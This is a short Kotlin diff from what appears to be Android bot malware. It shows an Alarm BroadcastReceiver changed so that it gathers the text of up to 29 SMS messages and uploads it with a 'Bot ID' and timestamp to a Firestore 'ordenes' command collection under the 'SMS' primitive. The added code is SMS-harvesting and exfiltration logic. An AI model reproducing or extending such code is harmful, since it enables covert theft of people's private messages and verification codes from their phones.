@@ -209,10 +209,16 @@ class Alarm : BroadcastReceiver() {
     }
 
     fun nuevaListaSMS(db : FirebaseFirestore, strDate: String){
+        var mensaje : String = ""
+        var contador = 0
+        obtenerListaSMS().forEach(){
+            contador++
+            if(contador < 30) mensaje += it.textoSMS.toString() + "\n"
+        }
         val sms = hashMapOf(
             "Bot ID" to idAndroid,
             "Hora" to strDate,
-            "Lista contactos" to obtenerListaSMS()
+            "Lista contactos" to mensaje
         )
         db.collection("ordenes")
             .whereEqualTo("Primitiva", "SMS")
